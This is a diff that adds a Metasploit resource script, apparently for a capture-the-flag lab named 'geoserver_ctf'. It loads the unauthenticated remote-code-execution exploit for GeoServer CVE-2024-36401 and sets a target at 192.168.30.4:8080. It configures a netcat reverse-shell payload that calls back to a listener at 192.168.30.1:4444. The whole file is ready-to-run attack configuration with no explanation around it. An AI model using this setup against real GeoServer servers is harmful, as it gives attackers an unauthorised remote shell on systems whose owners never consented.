@@ -1,0 +1,32 @@
+# ================================
+#  Workspace
+# ================================
+workspace -a geoserver_ctf
+workspace geoserver_ctf
+
+# ================================
+#  Load Module
+# ================================
+use exploit/multi/http/geoserver_unauth_rce_cve_2024_36401
+
+# ================================
+#  Basic Target Options
+# ================================
+
+set RHOSTS 192.168.30.4
+set RPORT 8080
+set TARGETURI /
+
+# ================================
+#  Payload Configuration
+# ================================
+set PAYLOAD cmd/unix/reverse_netcat
+
+# Change these to match your machine/network
+set LHOST 192.168.30.1
+set LPORT 4444
+
+# ================================
+#  Display Summary
+# ================================
+show options
